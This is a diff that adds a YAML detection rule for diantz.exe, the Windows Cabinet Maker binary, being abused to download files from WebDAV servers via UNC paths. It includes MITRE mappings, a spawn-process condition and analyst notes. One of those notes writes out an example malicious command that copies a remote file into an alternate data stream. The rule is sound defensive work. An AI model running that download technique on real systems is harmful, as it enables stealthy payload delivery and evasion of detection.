@@ -1,0 +1,51 @@
+name: Diantz retrieving code from WebDAV server
+id: d7a3c9f1-8e5b-4c2d-9a7e-b8f6d3e2a5c7
+version: 1.0.0
+description: |
+  Detects instances of the Microsoft Cabinet Maker equivalent (diantz.exe) retrieving 
+  code from a WebDAV server and storing contents locally. Attackers abuse this LOLBIN 
+  to download malicious files using UNC paths to WebDAV servers, bypassing traditional 
+  download detection mechanisms.
+enabled: true
+labels:
+  tactic.id: TA0005
+  tactic.name: Defense Evasion
+  tactic.ref: https://attack.mitre.org/tactics/TA0005/
+  technique.id: T1218
+  technique.name: System Binary Proxy Execution
+  technique.ref: https://attack.mitre.org/techniques/T1218/
+tags:
+  - lolbin
+  - webdav
+  - file download
+  - living off the land
+references:
+  - https://lolbas-project.github.io/lolbas/Binaries/Diantz/
+  - https://attack.mitre.org/techniques/T1218/
+  - https://attack.mitre.org/techniques/T1105/
+severity: high
+condition: >
+  spawn_process
+    and
+  ps.child.name = 'diantz.exe'
+    and
+  ps.child.exe imatches ('?:\\Windows\\System32\\diantz.exe', '?:\\Windows\\SysWOW64\\diantz.exe')
+    and
+  ps.child.cmdline icontains '\\\\'
+    and
+  not ps.child.cmdline icontains ('DDNFramework', 'Shoreline')
+output: |
+  Suspicious diantz.exe WebDAV download detected. Process %ps.exe (PID: %ps.pid) 
+  appears to be accessing a UNC/WebDAV path. Command: %ps.cmdline
+
+  Notes:
+
+  - Diantz.exe is the Microsoft Cabinet Maker tool, legitimate for creating .cab files
+  - Malicious usage pattern: diantz \\webdavserver\webdav\file.exe C:\Folder\file.txt:file.cab
+  - The double backslash (\\) indicates UNC path access, potentially to WebDAV servers
+  - T1105 (Ingress Tool Transfer) also applies when used for downloading malicious files
+  - Investigate the WebDAV server reputation and the files being accessed
+  - Check for alternate data streams (ADS) usage in the output path (:file.cab syntax)
+  - False positives may include legitimate UNC paths with double backslashes
+
+min-engine-version: 2.0.0
